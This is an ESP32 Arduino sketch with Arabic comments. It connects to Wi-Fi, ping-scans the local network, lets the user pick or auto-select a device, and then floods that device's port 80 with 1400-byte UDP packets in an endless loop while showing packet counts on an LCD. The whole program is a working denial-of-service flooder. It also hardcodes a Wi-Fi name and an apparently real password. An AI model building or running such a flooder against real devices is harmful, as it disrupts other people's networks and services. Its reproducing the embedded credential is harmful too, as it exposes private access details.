#include <WiFi.h>
#include <WiFiUdp.h>
#include <ESPping.h>
#include <Wire.h>
#include <LiquidCrystal_I2C.h>

LiquidCrystal_I2C lcd(0x27, 16, 2);

const char* ssid     = "RAM";
const char* password = "779443847r@00f";

#define BUTTON_PIN 0

WiFiUDP udp;
IPAddress devices[20];
int devicesFound = 0;
int selectedIndex = 0;

IPAddress targetIP(0, 0, 0, 0);
const int targetPort = 80;

unsigned long packetCount = 0;
unsigned long startTime   = 0;
unsigned long lastLCD     = 0;
float currentRate         = 0;

char payload[1400];

// ==========================================
// 1. مسح الشبكة + إضافة IP الكمبيوتر يدوياً
// ==========================================
void scanNetwork() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Scanning LAN...");

  Serial.println("\n=== Scanning LAN ===");
  devicesFound = 0;
  IPAddress localIP = WiFi.localIP();

  // 🎯 إضافة IP الكمبيوتر يدوياً
  IPAddress pcIP(192, 168, 0, 135);
  devices[devicesFound] = pcIP;
  devicesFound++;
  Serial.printf("[%d] Added PC: %s\n", devicesFound, pcIP.toString().c_str());

  for (int i = 1; i <= 254 && devicesFound < 20; i++) {
    IPAddress testIP(localIP[0], localIP[1], localIP[2], i);
    if (testIP == localIP) continue;
    if (testIP == pcIP) continue;

    lcd.setCursor(0, 1);
    lcd.print("Scan:");
    lcd.print(i);
    lcd.print("/254  ");

    if (Ping.ping(testIP, 1)) {
      devices[devicesFound] = testIP;
      devicesFound++;
      Serial.printf("[%d] Found: %s (%d ms)\n",
                    devicesFound,
                    testIP.toString().c_str(),
                    (int)Ping.averageTime());
    }
  }

  Serial.printf("\nTotal devices found: %d\n", devicesFound);
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Found: ");
  lcd.print(devicesFound);
  delay(2000);
}

// ==========================================
// 2. اختيار الجهاز يدوياً
// ==========================================
void selectTargetManually() {
  if (devicesFound == 0) {
    lcd.clear();
    lcd.print("No devices!");
    delay(3000);
    ESP.restart();
  }

  Serial.println("\n=== Select Target Manually ===");
  Serial.println("Press BOOT to cycle through devices");
  Serial.println("Wait 5 seconds to auto-confirm");

  unsigned long lastButtonTime = 0;
  unsigned long lastChangeTime = millis();
  const unsigned long AUTO_CONFIRM_MS = 5000;

  while (true) {
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("Target: ");
    lcd.print(selectedIndex + 1);
    lcd.print("/");
    lcd.print(devicesFound);

    lcd.setCursor(0, 1);
    lcd.print(devices[selectedIndex].toString());

    unsigned long elapsed = millis() - lastChangeTime;
    unsigned long remaining = (AUTO_CONFIRM_MS - elapsed) / 1000;

    if (remaining <= 3 && remaining > 0) {
      lcd.setCursor(14, 0);
      lcd.print(remaining);
      lcd.print(" ");
    }

    if (elapsed >= AUTO_CONFIRM_MS) {
      Serial.println("Auto-confirmed by timeout!");
      break;
    }

    if (digitalRead(BUTTON_PIN) == LOW && millis() - lastButtonTime > 300) {
      lastButtonTime = millis();
      selectedIndex = (selectedIndex + 1) % devicesFound;
      lastChangeTime = millis();
      Serial.printf("Selected: %s\n", devices[selectedIndex].toString().c_str());
    }

    delay(100);
  }

  targetIP = devices[selectedIndex];

  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Target:");
  lcd.setCursor(0, 1);
  lcd.print(targetIP.toString());
  delay(2000);
}

// ==========================================
// 3. عرض الإحصائيات
// ==========================================
void updateLCD() {
  unsigned long elapsed = (millis() - startTime) / 1000;
  currentRate = (elapsed > 0) ? (packetCount / (float)elapsed) : 0;

  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Tgt:");
  lcd.print(targetIP[3]);

  lcd.setCursor(0, 1);
  lcd.print("P:");
  if (packetCount > 999999) {
    lcd.print(packetCount / 1000);
    lcd.print("k");
  } else {
    lcd.print(packetCount);
  }

  lcd.print(" R:");
  lcd.print((int)currentRate);
}

// ==========================================
// 4. setup & loop
// ==========================================
void setup() {
  Serial.begin(115200);
  delay(500);

  pinMode(BUTTON_PIN, INPUT_PULLUP);

  Wire.begin(21, 22);
  lcd.init();
  lcd.backlight();

  lcd.setCursor(0, 0);
  lcd.print("Connecting...");

  WiFi.begin(ssid, password);
  Serial.print("Connecting to RAM");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("\nConnected!");
  Serial.printf("ESP32 IP: %s\n", WiFi.localIP().toString().c_str());

  scanNetwork();
  selectTargetManually();

  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Starting UDP...");

  for (int i = 0; i < 1400; i++) payload[i] = 'A' + (i % 26);
  udp.begin(random(1024, 65535));
  startTime = millis();
}

void loop() {
  udp.beginPacket(targetIP, targetPort);
  udp.write((uint8_t*)payload, sizeof(payload));
  udp.endPacket();
  packetCount++;

  if (millis() - lastLCD >= 500) {
    lastLCD = millis();
    updateLCD();

    static unsigned long lastSerial = 0;
    if (millis() - lastSerial >= 2000) {
      lastSerial = millis();
      unsigned long elapsed = (millis() - startTime) / 1000;
      Serial.printf("Target: %s | Pkts: %lu | Time: %lus | Rate: %.1f pkt/s\n",
                    targetIP.toString().c_str(), packetCount, elapsed, currentRate);
    }
  }
}